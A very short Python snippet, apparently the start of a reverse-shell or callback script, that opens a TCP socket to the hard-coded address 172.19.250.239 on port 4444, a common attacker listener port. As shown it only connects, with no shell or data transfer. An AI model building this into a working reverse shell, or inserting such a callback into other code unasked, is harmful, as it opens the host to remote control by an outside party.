import socket
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection.connect(("172.19.250.239",4444))

